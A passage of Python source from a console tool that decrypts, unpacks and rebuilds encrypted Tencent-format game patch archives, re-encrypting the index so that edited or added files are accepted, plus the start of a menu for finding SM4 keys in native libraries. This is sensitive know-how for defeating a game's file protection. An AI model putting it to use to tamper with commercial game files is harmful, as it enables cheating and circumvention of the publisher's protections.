        self._zstd_dict = ZstdCompressionDict(dict_data, dict_type=DICT_TYPE_AUTO)
    def _load_index(self, index_data) -> None:
        assert not self._pak_info.version <= 10
        reader = HR_Reader(index_data)
        self._mount_point = self._construct_mount_point(reader.string())
        self._files = [HR_TencentPakEntry(reader, self._pak_info.version) for _ in range(reader.u4())]
        for _ in range(reader.u8()):
            dir_path = PurePath(reader.string())
            e = {reader.string(): self._files[~reader.i4()] for _ in range(reader.u8())}
            if self._is_zstd_with_dict and dir_path.name == 'zstddic':
                assert len(e) == 1
                self._construct_zstd_dict(e[[*e.keys()][0]])
            else:
                self._index.update({PurePath(dir_path): e})
    def _write_to_disk(self, file_path: Path, entry: HR_TencentPakEntry) -> None:
        encryption_method = entry.encryption_method
        compression_method = entry.compression_method
        file_path.parent.mkdir(parents=True, exist_ok=True)
        with open(file_path, 'wb') as file:
            if compression_method == HR_CM_NONE:
                data = self._peek_content(entry.offset, entry.size, encryption_method)
                if entry.encrypted:
                    data = HR_PakCrypto.decrypt_block(bytes(data), file_path, encryption_method)
                file.write(data)
                return
            for x in HR_PakCrypto.generate_block_indices(len(entry.compressed_blocks), encryption_method):
                data = self._peek_block_content(entry.compressed_blocks[x], encryption_method)
                if entry.encrypted:
                    data = HR_PakCrypto.decrypt_block(bytes(data), file_path, encryption_method)
                data = HR_PakCompression.decompress_block(bytes(data), self._zstd_dict, compression_method)
                file.write(data)
    @staticmethod
    def _safe_disk_path(base: Path, *parts) -> Path:
        safe = base
        for part in parts:
            pp = PurePath(part)
            for piece in pp.parts:
                if piece in ('', '.', '..'):
                    continue
                clean = str(piece).replace('\x00', '_').replace('\r', '_').replace('\n', '_')
                clean = re.sub(r'[<>:"|?*]', '_', clean)
                safe = safe / clean
        return safe
    def dump(self, out_path: Path) -> None:
        output_root = Path(out_path)
        out_path = output_root / self._mount_point
        index_map = {}
        errors = []
        file_count = 0
        ok_count = 0
        total_files = sum(len(files) for files in self._index.values())
        console.print(f"\n📦 Extracting {total_files} files from {self._file_path.name}...")
        with Progress(
            SpinnerColumn(spinner_name='dots2', style='bold cyan'),
            TextColumn('[progress.description]{task.description}'),
            BarColumn(bar_width=None, style='cyan', complete_style='green', finished_style='green'),
            TaskProgressColumn(style='bold yellow'),
            TimeElapsedColumn(),
            console=console,
            expand=True,
        ) as progress:
            task = progress.add_task('[cyan]Starting unpack...[/cyan]', total=total_files)
            for dir_path, dir_dict in self._index.items():
                current_out_path = self._safe_disk_path(out_path, dir_path)
                current_out_path.mkdir(parents=True, exist_ok=True)
                for file_name, entry in dir_dict.items():
                    file_count += 1
                    file_path = self._safe_disk_path(current_out_path, file_name)
                    rel_display = str((dir_path / file_name)).replace('\\', '/')
                    if len(rel_display) > 58:
                        rel_display = '...' + rel_display[-55:]
                    progress.update(task, description=f'[cyan]{file_count}/{total_files}[/cyan] [white]{rel_display}[/white]')
                    try:
                        self._write_to_disk(file_path, entry)
                        ok_count += 1
                    except Exception as e:
                        errors.append(f'{dir_path / file_name}: {type(e).__name__}: {e}')
                        progress.console.print(f'[yellow]⚠ Extract failed: {file_name}[/yellow]')
                    try:
                        rel_out = str(file_path.relative_to(output_root)).replace('\\', '/')
                        internal = str((dir_path / file_name)).replace('\\', '/').lstrip('/')
                        index_map[rel_out] = internal
                    except Exception:
                        pass
                    progress.advance(task)
        if index_map:
            try:
                idx_path = output_root / 'pak_index.json'
                import json
                idx_path.write_text(json.dumps(index_map, indent=2, ensure_ascii=False), encoding='utf-8')
                console.print(f"🧭 pak_index.json saved: {idx_path}")
            except Exception as ie:
                console.print(f"[yellow]⚠ Could not save pak_index.json: {ie}[/yellow]")
        console.print(Panel(
            f'[bold green]✅ Extraction complete![/bold green]\n'
            f'[white]Decoded files:[/] [green]{ok_count}[/green]\n'
            f'[cyan]Output:[/] {out_path}',
            title='UNPACK COMPLETE', border_style='green', box=box.DOUBLE_EDGE, padding=(1, 2)
        ))
    @staticmethod
    def _extract_entry_plain(pak_buffer: bytes, entry: 'HR_TencentPakEntry',
                             file_path_for_crypto: PurePath, zstd_dict) -> bytes:
        if entry.compression_method == HR_CM_NONE:
            sz = HR_PakCrypto.align_encrypted_content_size(entry.size, entry.encryption_method)
            data = bytes(pak_buffer[entry.offset:][:sz])
            if entry.encrypted:
                data = HR_PakCrypto.decrypt_block(data, file_path_for_crypto, entry.encryption_method)
            return data
        parts = []
        for real_idx in HR_PakCrypto.generate_block_indices(len(entry.compressed_blocks), entry.encryption_method):
            block = entry.compressed_blocks[real_idx]
            bsz = HR_PakCrypto.align_encrypted_content_size(block.end - block.start, entry.encryption_method)
            blk = bytes(pak_buffer[block.start:][:bsz])
            if entry.encrypted:
                blk = HR_PakCrypto.decrypt_block(blk, file_path_for_crypto, entry.encryption_method)
            dec = HR_PakCompression.decompress_block(blk, zstd_dict, entry.compression_method)
            parts.append(dec)
        return b''.join(parts)
    def rebuild_inplace(self, edited_folder: Path, output_pak: Path) -> None:
        """Smart rebuild: only edited files are relocated to the end of the PAK."""
        if not edited_folder.exists():
            raise FileNotFoundError(f'Edited folder not found: {edited_folder}')
        console.print(Panel(
            f'[bold cyan]⚙ SMART REBUILD (Relocate Edited Files)[/bold cyan]\n'
            f'[white]Source PAK:[/] [yellow]{self._file_path.name}[/yellow]\n'
            f'[white]Output   :[/] [cyan]{output_pak.name}[/cyan]\n'
            f'[dim]Unedited files stay in place. Edited files appended at end.[/dim]',
            title='REBUILD MODE', border_style='cyan', padding=(0, 2)
        ))
        # ---- Step 1: Build edited file lookup ----
        console.print('\n[bold cyan]━━ STEP 1/5 : SCANNING EDITED FILES ━━[/bold cyan]')
        edited_by_relpath: dict[str, Path] = {}
        edited_by_basename: dict[str, list[Path]] = {}
        for f in edited_folder.rglob('*'):
            if not f.is_file():
                continue
            if f.suffix.lower() in ['.pak', '.txt', '.json', '.log', '.md']:
                continue
            try:
                rel = str(f.relative_to(edited_folder)).replace('\\', '/').lstrip('/')
                edited_by_relpath[rel.lower()] = f
            except Exception:
                pass
            edited_by_basename.setdefault(f.name, []).append(f)
        console.print(f'[green]✔ Found {len(edited_by_relpath)} edited file(s)[/green]')
        # ---- Step 2: Build entry -> (dir, name) map ----
        entry_to_path: dict[int, tuple] = {}
        for dir_path, files in self._index.items():
            for fname, entry in files.items():
                entry_to_path[id(entry)] = (dir_path, fname)
        # ---- Step 3: Process each original file ----
        console.print('\n[bold cyan]━━ STEP 2/5 : PROCESSING FILES ━━[/bold cyan]')
        orig_index_offset = self._pak_info.index_offset
        new_data_region = bytearray()
        current_new_offset = orig_index_offset
        new_entries = []
        matched_edited_paths = set()
        edited_count = 0
        unchanged_count = 0
        for i, entry in enumerate(self._files):
            dir_path, fname = entry_to_path.get(id(entry), (PurePath(), f'unknown_{i}'))
            full_internal = str(dir_path / fname).replace('\\', '/').lstrip('/')
            file_path_for_crypto = PurePath(fname)
            edited_file = None
            for k in (full_internal.lower(), fname.lower()):
                if k in edited_by_relpath:
                    edited_file = edited_by_relpath[k]
                    break
            if edited_file is None and fname in edited_by_basename:
                candidates = edited_by_basename[fname]
                edited_file = candidates[0] if len(candidates) == 1 else candidates[0]
            if edited_file is not None:
                matched_edited_paths.add(str(edited_file))
                edited_count += 1
                try:
                    new_plain = edited_file.read_bytes()
                    console.print(f'   [green]✔ EDITED:[/] {full_internal} [dim]({len(new_plain):,} bytes)[/dim]')
                except Exception as e:
                    console.print(f'   [yellow]⚠ Could not read {edited_file.name}: {e} — keeping original[/yellow]')
                    new_entries.append({
                        'content_hash': entry.content_hash,
                        'offset': entry.offset, 'uncompressed_size': entry.uncompressed_size,
                        'size': entry.size, 'comp_method': entry.compression_method,
                        'enc_method': entry.encryption_method if entry.encrypted else 0,
                        'encrypted': entry.encrypted, 'block_size_val': entry.compression_block_size,
                        'compressed_blocks': [(b.start, b.end) for b in entry.compressed_blocks],
                        'unk1': entry.unk1, 'unk2': entry.unk2,
                        'index_new_sep': entry.index_new_sep,
                    })
                    unchanged_count += 1
                    continue
                comp_method = entry.compression_method
                enc_method = entry.encryption_method if entry.encrypted else 0
                block_size_val = entry.compression_block_size or 0x10000
                if comp_method == HR_CM_NONE:
                    plain_block = new_plain
                    if entry.encrypted:
                        aligned_size = HR_PakCrypto.align_encrypted_content_size(len(plain_block), enc_method)
                        padded = plain_block + b'\x00' * (aligned_size - len(plain_block))
                        stored_data = HR_PakCrypto.encrypt_block(padded, file_path_for_crypto, enc_method)
                    else:
                        stored_data = plain_block
                    new_size = len(stored_data)
                    new_compressed_blocks = []
                else:
                    chunks = []
                    for j in range(0, len(new_plain), block_size_val):
                        chunks.append(new_plain[j:j + block_size_val])
                    if not chunks:
                        chunks = [b'']
                    compressed_chunks = []
                    for chunk in chunks:
                        best = HR_PakCompression.best_compress_for_slot(
                            chunk, self._zstd_dict, comp_method, 1 << 30
                        )
                        if best is None:
                            comp_data = chunk
                        else:
                            comp_data, _, _ = best
                        compressed_chunks.append(comp_data)
                    encrypted_chunks = []
                    for comp_data in compressed_chunks:
                        if entry.encrypted:
                            aligned_size = HR_PakCrypto.align_encrypted_content_size(len(comp_data), enc_method)
                            padded = comp_data + b'\x00' * (aligned_size - len(comp_data))
                            cipher = HR_PakCrypto.encrypt_block(padded, file_path_for_crypto, enc_method)
                            encrypted_chunks.append(cipher)
                        else:
                            encrypted_chunks.append(comp_data)
                    n_blocks = len(encrypted_chunks)
                    indices = HR_PakCrypto.generate_block_indices(n_blocks, enc_method)
                    physical_blocks = [None] * n_blocks
                    for j, chunk_data in enumerate(encrypted_chunks):
                        physical_blocks[indices[j]] = chunk_data
                    physical_offsets = []
                    block_cursor = current_new_offset
                    for phys_block in physical_blocks:
                        physical_offsets.append((block_cursor, block_cursor + len(phys_block)))
                        block_cursor += len(phys_block)
                    new_compressed_blocks = physical_offsets
                    stored_data = b''.join(physical_blocks)
                    new_size = len(stored_data)
                    if entry.encrypted:
                        aligned_total = HR_PakCrypto.align_encrypted_content_size(new_size, enc_method)
                        if aligned_total > new_size:
                            stored_data = stored_data + b'\x00' * (aligned_total - new_size)
                            new_size = aligned_total
                new_content_hash = SHA1.new(stored_data).digest()
                new_data_region.extend(stored_data)
                new_entries.append({
                    'content_hash': new_content_hash,
                    'offset': current_new_offset,
                    'uncompressed_size': len(new_plain),
                    'size': new_size,
                    'comp_method': comp_method,
                    'enc_method': enc_method,
                    'encrypted': entry.encrypted,
                    'block_size_val': block_size_val,
                    'compressed_blocks': new_compressed_blocks,
                    'unk1': entry.unk1, 'unk2': entry.unk2,
                    'index_new_sep': entry.index_new_sep,
                })
                current_new_offset += new_size
            else:
                unchanged_count += 1
                new_entries.append({
                    'content_hash': entry.content_hash,
                    'offset': entry.offset,
                    'uncompressed_size': entry.uncompressed_size,
                    'size': entry.size,
                    'comp_method': entry.compression_method,
                    'enc_method': entry.encryption_method if entry.encrypted else 0,
                    'encrypted': entry.encrypted,
                    'block_size_val': entry.compression_block_size,
                    'compressed_blocks': [(b.start, b.end) for b in entry.compressed_blocks],
                    'unk1': entry.unk1, 'unk2': entry.unk2,
                    'index_new_sep': entry.index_new_sep,
                })
        console.print(f'[green]✔ Processed:[/] [yellow]{edited_count} edited[/yellow], '
                      f'[green]{unchanged_count} unchanged[/green]')
        # ---- Step 3b: Add NEW files ----
        new_files_added = []
        for rel_lower, edited_file in edited_by_relpath.items():
            if str(edited_file) in matched_edited_paths:
                continue
            try:
                new_plain = edited_file.read_bytes()
            except Exception as e:
                console.print(f'   [yellow]⚠ Could not read new file {edited_file.name}: {e}[/yellow]')
                continue
            console.print(f'   [blue]✨ NEW:[/] {rel_lower} [dim]({len(new_plain):,} bytes)[/dim]')
            comp_method = HR_CM_ZSTD if not self._zstd_dict else HR_CM_ZSTD_DICT
            enc_method = 0
            block_size_val = 0x10000
            file_path_for_crypto = PurePath(edited_file.name)
            chunks = []
            for j in range(0, len(new_plain), block_size_val):
                chunks.append(new_plain[j:j + block_size_val])
            if not chunks:
                chunks = [b'']
            compressed_chunks = []
            for chunk in chunks:
                best = HR_PakCompression.best_compress_for_slot(
                    chunk, self._zstd_dict, comp_method, 1 << 30
                )
                if best is None:
                    comp_data = chunk
                    comp_method = HR_CM_NONE
                else:
                    comp_data, _, _ = best
                compressed_chunks.append(comp_data)
            n_blocks = len(compressed_chunks)
            indices = HR_PakCrypto.generate_block_indices(n_blocks, enc_method)
            physical_blocks = [None] * n_blocks
            for j, chunk_data in enumerate(compressed_chunks):
                physical_blocks[indices[j]] = chunk_data
            physical_offsets = []
            block_cursor = current_new_offset
            for phys_block in physical_blocks:
                physical_offsets.append((block_cursor, block_cursor + len(phys_block)))
                block_cursor += len(phys_block)
            new_compressed_blocks = physical_offsets
            stored_data = b''.join(physical_blocks)
            new_size = len(stored_data)
            new_content_hash = SHA1.new(stored_data).digest()
            new_data_region.extend(stored_data)
            rel_posix = rel_lower.replace('\\', '/')
            parts = rel_posix.rsplit('/', 1)
            if len(parts) == 2:
                dir_str, file_name = parts[0], parts[1]
            else:
                dir_str, file_name = '', parts[0]
            dir_path = PurePath(dir_str) if dir_str else PurePath()
            new_entries.append({
                'content_hash': new_content_hash,
                'offset': current_new_offset,
                'uncompressed_size': len(new_plain),
                'size': new_size,
                'comp_method': comp_method,
                'enc_method': enc_method,
                'encrypted': False,
                'block_size_val': block_size_val,
                'compressed_blocks': new_compressed_blocks,
                'unk1': 0, 'unk2': b'\x00' * 20,
                'index_new_sep': 0,
                '_dir_path': dir_path,
                '_file_name': file_name,
            })
            new_files_added.append(len(new_entries) - 1)
            current_new_offset += new_size
        if new_files_added:
            console.print(f'[blue]✨ Added {len(new_files_added)} new file(s)[/blue]')
        # ---- Step 4: Build new index_data ----
        console.print('\n[bold cyan]━━ STEP 3/5 : BUILDING INDEX ━━[/bold cyan]')
        keystream = HR_PakCrypto.zuc_keystream()
        version = self._pak_info.version
        header_size = HR_TencentPakInfo._mem_size(version)
        PAK_MAGIC = self._pak_info.magic
        index_data = bytearray()
        raw_orig_index = self._file_content[self._pak_info.index_offset:][:self._pak_info.index_size]
        orig_index_decoded = HR_PakCrypto.decrypt_index(raw_orig_index, self._pak_info)
        orig_reader = HR_Reader(orig_index_decoded)
        orig_mount_len = orig_reader.i4()
        orig_mount_bytes = bytes(orig_reader.s(orig_mount_len))
        index_data.extend(struct.pack('<I', orig_mount_len))
        index_data.extend(orig_mount_bytes)
        index_data.extend(struct.pack('<I', len(new_entries)))
        for item in new_entries:
            index_data.extend(item['content_hash'])
            if version <= 1:
                index_data.extend(struct.pack('<Q', 0))
            index_data.extend(struct.pack('<Q', item['offset']))
            index_data.extend(struct.pack('<Q', item['uncompressed_size']))
            index_data.extend(struct.pack('<I', item['comp_method'] & HR_CM_MASK))
            index_data.extend(struct.pack('<Q', item['size']))
            if version >= 5:
                index_data.extend(struct.pack('<B', item['unk1']))
                index_data.extend(item['unk2'] if item['unk2'] else b'\x00' * 20)
            if item['comp_method'] != HR_CM_NONE and version >= 3:
                index_data.extend(struct.pack('<I', len(item['compressed_blocks'])))
                for (start, end) in item['compressed_blocks']:
                    index_data.extend(struct.pack('<Q', start))
                    index_data.extend(struct.pack('<Q', end))
            if version >= 4:
                index_data.extend(struct.pack('<I', item['block_size_val']))
            if version >= 4:
                index_data.extend(struct.pack('<B', 1 if item['encrypted'] else 0))
            if version >= 12:
                index_data.extend(struct.pack('<I', item['enc_method']))
                index_data.extend(struct.pack('<I', item['index_new_sep']))
        file_to_dirname: dict[int, tuple] = {}
        for dir_path, files_dict in self._index.items():
            dir_str = dir_path.as_posix()
            for fname, entry in files_dict.items():
                for i, fe in enumerate(self._files):
                    if id(fe) == id(entry):
                        file_to_dirname[i] = (dir_str, fname)
                        break
        for i, item in enumerate(new_entries):
            if i not in file_to_dirname:
                if '_dir_path' in item:
                    file_to_dirname[i] = (item['_dir_path'].as_posix(), item['_file_name'])
                else:
                    file_to_dirname[i] = ('', f'file_{i}')
        all_dirs: list[str] = []
        dir_to_files: dict[str, list[tuple]] = {}
        for dir_path in self._index.keys():
            ds = dir_path.as_posix()
            all_dirs.append(ds)
            dir_to_files[ds] = []
        new_dirs: list[str] = []
        for i, item in enumerate(new_entries):
            ds, fn = file_to_dirname[i]
            if ds not in dir_to_files:
                dir_to_files[ds] = []
                all_dirs.append(ds)
                new_dirs.append(ds)
            dir_to_files[ds].append((fn, i))
        index_data.extend(struct.pack('<Q', len(all_dirs)))
        for dir_str in all_dirs:
            files_list = dir_to_files[dir_str]
            if not dir_str or dir_str == '.':
                index_data.extend(struct.pack('<I', 0))
            else:
                if not dir_str.endswith('/'):
                    dir_str_with_slash = dir_str + '/'
                else:
                    dir_str_with_slash = dir_str
                dir_bytes = dir_str_with_slash.encode('utf-8') + b'\x00'
                index_data.extend(struct.pack('<I', len(dir_bytes)))
                index_data.extend(dir_bytes)
            index_data.extend(struct.pack('<Q', len(files_list)))
            for file_name, fi in files_list:
                name_bytes = file_name.encode('utf-8') + b'\x00'
                index_data.extend(struct.pack('<I', len(name_bytes)))
                index_data.extend(name_bytes)
                index_data.extend(struct.pack('<i', -fi - 1))
        index_data.extend(b'\x1d\x00\x00\x00\x2e\x2e')
        index_size_decrypted = len(index_data)
        index_hash = SHA1.new(bytes(index_data)).digest()
        console.print(f'[green]✔ Index built:[/] {index_size_decrypted:,} bytes, '
                      f'SHA1={index_hash.hex()[:16]}...')
        # ---- Step 5: Encrypt index ----
        console.print('\n[bold cyan]━━ STEP 4/5 : ENCRYPTING INDEX ━━[/bold cyan]')
        if version > 7 and self._pak_info.index_encrypted:
            key = HR_PakCrypto.rsa_extract(self._pak_info.packed_key, HR_RSA_MOD_1)
            iv = HR_PakCrypto.rsa_extract(self._pak_info.packed_iv, HR_RSA_MOD_1)
            assert len(key) == 32 and len(iv) == 32
            padded = pad(bytes(index_data), AES.block_size)
            aes = AES.new(key, MODE_CBC, iv[:16])
            encrypted_index = aes.encrypt(padded)
            console.print(f'[green]✔ Index encrypted with AES-CBC[/green]')
        elif self._pak_info.index_encrypted:
            encrypted_index = bytes(HR_PakCrypto._encrypt_simple1(bytes(index_data)))
            console.print(f'[green]✔ Index encrypted with SIMPLE1[/green]')
        else:
            encrypted_index = bytes(index_data)
            console.print(f'[dim]ℹ Index not encrypted[/dim]')
        index_size = len(encrypted_index)
        # ---- Step 6: Write the new PAK ----
        console.print('\n[bold cyan]━━ STEP 5/5 : WRITING NEW PAK ━━[/bold cyan]')
        new_index_offset = orig_index_offset + len(new_data_region)
        encrypted_magic = PAK_MAGIC ^ keystream[2]
        key_stream_hash = struct.pack('<5I', *keystream[4:][:5])
        encrypted_index_hash = bytes(a ^ b for a, b in zip(index_hash, key_stream_hash))
        encrypted_index_size = index_size ^ ((keystream[10] << 32) | keystream[11])
        encrypted_index_offset = new_index_offset ^ ((keystream[0] << 32) | keystream[1])
        encrypted_flag_byte = (1 if self._pak_info.index_encrypted else 0) ^ (keystream[3] & 0xFF)
        orig_data_region = bytes(self._file_content[0:orig_index_offset])
        output_pak.parent.mkdir(parents=True, exist_ok=True)
        with open(output_pak, 'wb') as f:
            f.write(orig_data_region)
            f.write(bytes(new_data_region))
            f.write(encrypted_index)
            if version >= 7:
                key_unk1 = struct.pack('<8I', *keystream[7:][:8])
                unk1_plain = self._pak_info.unk1 if self._pak_info.unk1 else b'\x00' * 32
                encrypted_unk1 = bytes(a ^ b for a, b in zip(unk1_plain, key_unk1))
                f.write(encrypted_unk1)
            if version >= 8:
                f.write(self._pak_info.packed_key if self._pak_info.packed_key else b'\x00' * 256)
                f.write(self._pak_info.packed_iv if self._pak_info.packed_iv else b'\x00' * 256)
                f.write(self._pak_info.packed_index_hash if self._pak_info.packed_index_hash else b'\x00' * 256)
            if version >= 9:
                f.write(struct.pack('<I', (self._pak_info.stem_hash or 0) ^ keystream[8]))
                f.write(struct.pack('<I', (self._pak_info.unk2 or 0) ^ keystream[9]))
            if version >= 12:
                f.write(self._pak_info.content_org_hash if self._pak_info.content_org_hash else b'\x00' * 20)
            f.write(struct.pack('<B', encrypted_flag_byte))
            f.write(struct.pack('<I', encrypted_magic))
            f.write(struct.pack('<I', version))
            if version >= 6:
                f.write(encrypted_index_hash)
            else:
                f.write(b'\x00' * 20)
            f.write(struct.pack('<Q', encrypted_index_size))
            f.write(struct.pack('<Q', encrypted_index_offset))
        actual_size = output_pak.stat().st_size
        expected_size = new_index_offset + len(encrypted_index) + header_size
        if actual_size != expected_size:
            console.print(f'[yellow]⚠ Size mismatch: actual={actual_size:,}, '
                          f'expected={expected_size:,}[/yellow]')
        try:
            verify_pak = HR_TencentPakFile(output_pak, is_od=True)
            verify_count = sum(len(d) for d in verify_pak._index.values())
            console.print(f'[green]✔ Verification: reloaded PAK OK, {verify_count} files indexed[/green]')
        except Exception as ve:
            console.print(f'[yellow]⚠ Verification: could not reload new PAK: {ve}[/yellow]')
        console.print(Panel(
            f'[bold green]🎉 SMART REBUILD COMPLETE![/bold green]\n\n'
            f'[white]Output  :[/] [cyan]{output_pak.name}[/cyan]\n'
            f'[white]Size    :[/] [dim]{actual_size:,} bytes[/dim]\n'
            f'[white]Files   :[/] [green]{len(new_entries)}[/green] '
            f'([yellow]{edited_count} edited[/yellow], [blue]{len(new_files_added)} new[/blue])\n'
            f'[white]Index   :[/] [dim]{index_size:,} bytes[/dim]\n\n'
            f'[dim]Unedited files preserved at original offsets.[/dim]\n'
            f'[dim]Edited files relocated to end of PAK.[/dim]',
            title='✅ SUCCESS', border_style='green', padding=(1, 2)
        ))

# ==================== HR DHAMA UI FUNCTIONS ====================
def hr_ensure_dirs():
    """Create HR DHAMA directories"""
    dirs = [HR_INPUT_DIR, HR_EDITED_DIR, HR_UNPACKED_DIR, HR_REPACKED_DIR]
    for d in dirs:
        d.mkdir(parents=True, exist_ok=True)

def hr_get_pak_files() -> list[Path]:
    if not HR_INPUT_DIR.exists():
        return []
    return sorted(HR_INPUT_DIR.glob('*.pak'), key=lambda p: p.stat().st_mtime, reverse=True)

def hr_select_pak_file() -> Path | None:
    paks = hr_get_pak_files()
    if not paks:
        console.print(Panel(
            '[red]❌ No PAK files found in HR_DHAMA/GAMEPATCH/INPUT/[/red]\n'
            '[cyan]💡 Put your game_patch PAK file in the INPUT folder.[/cyan]',
            title='No PAK Files', border_style='red'
        ))
        return None
    console.print('\n[cyan]Available PAK files:[/cyan]')
    for i, p in enumerate(paks, 1):
        size_mb = p.stat().st_size / (1024 * 1024)
        console.print(f'  [yellow]{i}.[/yellow] [white]{p.name}[/white] [dim]({size_mb:.1f} MB)[/dim]')
    try:
        choice = Prompt.ask('[yellow]Select PAK file number[/yellow]', default='1')
        idx = int(choice) - 1
        if 0 <= idx < len(paks):
            return paks[idx]
    except Exception:
        pass
    return None

def hr_handle_unpack():
    theme = get_theme_colors()
    console.print(Panel(
        f'[{theme["title"]}]📦 HR DHAMA - GAMEPATCH UNPACK[/]\n'
        f'[{theme["dim"]}]{"─" * 36}[/]\n\n'
        f'[{theme["info"]}]Extract all files from GAMEPATCH PAK.[/]',
        border_style=theme["panel_border"],
        box=box.ROUNDED
    ))
    console.print()
    
    pak_file = hr_select_pak_file()
    if not pak_file:
        Prompt.ask('[white]Press Enter to continue...[/white]', default='')
        return

    console.print(Panel(f'[blue]📁 Unpacking: {pak_file.name}[/blue]', title='Unpacking', border_style='blue'))
    try:
        pak_instance = HR_TencentPakFile(pak_file, is_od=False)
        output_folder = HR_UNPACKED_DIR / pak_file.stem
        pak_instance.dump(output_folder)
    except Exception as e:
        console.print(Panel(f'[red]❌ Unpack failed: {e}[/red]', title='Error', border_style='red'))
        traceback.print_exc()
    Prompt.ask('[white]Press Enter to continue...[/white]', default='')

def hr_handle_repack():
    theme = get_theme_colors()
    console.print(Panel(
        f'[{theme["title"]}]🏗️ HR DHAMA - SMART REBUILD[/]\n'
        f'[{theme["dim"]}]{"─" * 36}[/]\n\n'
        f'[{theme["info"]}]Smart Rebuild with no size limit — edited files relocated to end.[/]',
        border_style=theme["panel_border"],
        box=box.ROUNDED
    ))
    console.print()
    
    pak_file = hr_select_pak_file()
    if not pak_file:
        Prompt.ask('[white]Press Enter to continue...[/white]', default='')
        return

    if not HR_EDITED_DIR.exists() or not any(HR_EDITED_DIR.rglob('*')):
        console.print(Panel(
            '[red]❌ No files found in EDITED folder![/red]\n'
            '[cyan]💡 Put your edited files (any size) in the EDITED folder.[/cyan]\n'
            '[dim]Files NOT in EDITED will be copied as-is from the original PAK.[/dim]',
            title='❌ Error', border_style='red'
        ))
        Prompt.ask('[white]Press Enter to continue...[/white]', default='')
        return

    console.print(Panel(
        f'[bold cyan]⚙ SMART REBUILD PIPELINE[/bold cyan]\n'
        f'[white]PAK:[/] [yellow]{pak_file.name}[/yellow]\n'
        f'[dim]No size limit — files can be any size.[/dim]',
        border_style='cyan', padding=(0, 2)
    ))

    try:
        pak_instance = HR_TencentPakFile(pak_file, is_od=False)
        output_pak = HR_REPACKED_DIR / pak_file.name
        output_pak.parent.mkdir(exist_ok=True)
        pak_instance.rebuild_inplace(HR_EDITED_DIR, output_pak)
        console.print(Panel(
            f'[bold green]🎉 REBUILD COMPLETE![/bold green]\n\n'
            f'[white]Output PAK :[/] [cyan]{output_pak.name}[/cyan]\n'
            f'[white]Location   :[/] [dim]{output_pak.parent}[/dim]',
            title='✅ Success', border_style='green', padding=(1, 2)
        ))
    except Exception as e:
        console.print(Panel(f'[red]❌ Rebuild failed[/red]\n{e}', title='Error', border_style='red'))
        traceback.print_exc()
    Prompt.ask('[white]Press Enter to continue...[/white]', default='')

def hr_show_info():
    theme = get_theme_colors()
    info_text = f"""
[{theme["title"]}]📖 HR DHAMA - GAMEPATCH STANDALONE[/]

[{theme["accent"]}]🔧 WHAT IT DOES:[/]
This is a standalone GAMEPATCH tool with:
• Unpack PAK — Extract all files from GAMEPATCH PAK
• Smart Rebuild — No size limit, edited files relocated to end

[{theme["accent"]}]📁 FOLDER STRUCTURE:[/]
[{theme["text"]}]HR_DHAMA/GAMEPATCH/[/]
├── INPUT/           ← Place your game_patch PAK here
├── EDITED/          ← Place your edited files here
├── UNPACKED/        ← Extracted files go here
└── REPACKED/        ← Repacked PAK goes here

[{theme["accent"]}]🔄 WORKFLOW:[/]
1. Place .pak in [{theme["text"]}]INPUT/[/]
2. Run [{theme["text"]}]Option 1 - Unpack PAK[/]
3. Edit files in [{theme["text"]}]UNPACKED/[/]
4. Place edited files in [{theme["text"]}]EDITED/[/]
5. Run [{theme["text"]}]Option 2 - Smart Rebuild[/]

[{theme["accent"]}]💡 SMART REBUILD FEATURES:[/]
• No file size limit
• Edited files relocated to end of PAK
• Unedited files stay in place
• Supports adding NEW files
• Automatic index rebuild
"""
    console.print(Panel(
        info_text,
        border_style=theme["panel_border"],
        box=box.ROUNDED
    ))
    Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

# ==================== HR DHAMA MAIN MENU ====================
def handle_hr_dhama_tool():
    """HR DHAMA - GAMEPATCH Standalone Tool handler - Sub-option of PAK+LUA Tool"""
    theme = get_theme_colors()
    
    # Ensure directories exist
    hr_ensure_dirs()
    
    while True:
        show_banner()
        
        menu_content = f"""
[{theme["title"]}]🎮 HR DHAMA - GAMEPATCH TOOL[/]
[{theme["dim"]}]{"─" * 36}[/]

[{theme["info"]}]📂 Tool Directory: {HR_GAMEPATCH_DIR}[/]

[{theme["success"]}][1][/{theme["success"]}] UNPACK PAK             [{theme["accent"]}]➛ Extract all files from GAMEPATCH[/]
[{theme["success"]}][2][/{theme["success"]}] SMART REBUILD          [{theme["accent"]}]➛ No size limit — edited files relocated[/]
[{theme["success"]}][3][/{theme["success"]}] SHOW INFO             [{theme["accent"]}]➛ Tool documentation[/]

[{theme["error"]}][0][/{theme["error"]}] BACK TO PAK+LUA MENU
"""
        
        console.print(Panel(
            menu_content,
            border_style=theme["panel_border"],
            padding=(1, 3),
            box=box.ROUNDED
        ))
        console.print()
        
        try:
            choice = Prompt.ask(f'[{theme["accent"]}]Select option [/]', default='', show_default=False)
        except KeyboardInterrupt:
            break
        
        if choice == "1":
            hr_handle_unpack()
        elif choice == "2":
            hr_handle_repack()
        elif choice == "3":
            hr_show_info()
        elif choice == "0":
            break
        else:
            console.print(Panel(
                f'[{theme["error"]}]❌ Option {choice} is invalid[/]',
                border_style=theme["error"],
                padding=(1, 2),
                box=box.ROUNDED
            ))
            Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

# ==================== END HR DHAMA TOOL ====================

# ==================== SM4 KEY FINDER INTEGRATION ====================

def handle_sm4_finder():
    """SM4 Key Finder Tool - Integrated with TOXIC UI"""
    while True:
        show_banner()
        
        # Use rich panel with TOXIC styling
        sm4_menu_panel = Panel(
            f'[bold cyan]🔑  SM4 KEY FINDER TOOL[/bold cyan]\n[cyan]{"─" * 32}[/]\n\n'
            f'[green]📂 Input Folder:[/] [white]{BASE_DIR / "SM4_FINDER" / "input"}[/white]\n'
            f'[green]📁 Output Folder:[/] [white]{BASE_DIR / "SM4_FINDER" / "output"}[/white]\n\n'
            f'[bold green][1][/bold green] SCAN .so FILES      [bold yellow]➛ Put .so in input folder[/bold yellow]\n'
            f'[bold green][2][/bold green] VIEW SAVED RESULTS  [bold yellow]➛ View previous scan results[/bold yellow]\n'
            f'[bold green][3][/bold green] OPEN FOLDERS        [bold yellow]➛ Open input/output folders[/bold yellow]\n\n'
            f'[bold red][0][/bold red] BACK TO MAIN MENU',
            border_style="magenta",
            padding=(1, 3),
            box=box.ROUNDED
        )
        console.print(sm4_menu_panel)
        console.print()
        
        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            break
        
        if choice == "1":
            scan_so_files_with_progress()
        elif choice == "2":
